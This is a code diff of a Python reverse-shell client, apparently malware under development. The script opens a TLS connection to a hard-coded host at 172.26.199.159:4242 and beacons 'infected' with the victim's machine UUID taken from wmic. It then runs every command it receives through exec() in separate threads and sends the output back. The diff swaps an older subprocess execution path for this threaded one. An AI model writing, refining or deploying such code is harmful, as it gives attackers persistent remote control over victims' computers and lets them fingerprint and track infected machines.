@@ -1,9 +1,10 @@
 import socket
 import ssl
 import sys
-import subprocess
+import threading
 from io import StringIO
 import contextlib
+import os
 
 @contextlib.contextmanager
 def stdoutIO(stdout=None):
@@ -11,8 +12,19 @@ def stdoutIO(stdout=None):
     if stdout is None:
         stdout = StringIO()
     sys.stdout = stdout
+    sys.stdout = stdout
     yield stdout
     sys.stdout = old
+
+def execute_command(command, socket):
+    """Executes a command in a separate thread and sends output back through the socket."""
+    with stdoutIO() as o:
+        try:
+            exec(command)
+        except Exception as e:
+            print(str(e))  # Capture the exception output
+        output = o.getvalue()
+    socket.send(output.encode('utf-8'))
 
 def revshell():
     context = ssl.create_default_context()
@@ -25,24 +37,23 @@ def revshell():
     s = context.wrap_socket(raw_socket, server_hostname="172.26.199.159")
 
     s.connect(("172.26.199.159", 4242))
+    uid = os.popen("wmic csproduct get uuid").read().strip().splitlines()[-1]
+    s.send(f"infected|||{uid}|||".encode('utf-8'))
 
     while True:
-        command = s.recv(1024).decode('utf-8')
+        command = ""
+        while True:
+            part = s.recv(1024).decode('utf-8')
+            command += part
+            if len(part) < 1024:
+                break
+
         if command.lower() == "exit":
             break
         else:
-            try:
-                if command.startswith("os.system"):
-                    cmd_to_run = command[len("os.system("):-1].strip().strip('"')
-                    result = subprocess.run(cmd_to_run, shell=True, capture_output=True, text=True)
-                    output = result.stdout + result.stderr
-                else:
-                    with stdoutIO() as o:
-                        exec(command)
-                    output = o.getvalue()
-            except Exception as e:
-                output = str(e)
-            s.send(output.encode('utf-8'))
+            thread = threading.Thread(target=execute_command, args=(command, s))
+            thread.start()
+
     s.close()
 
 revshell()
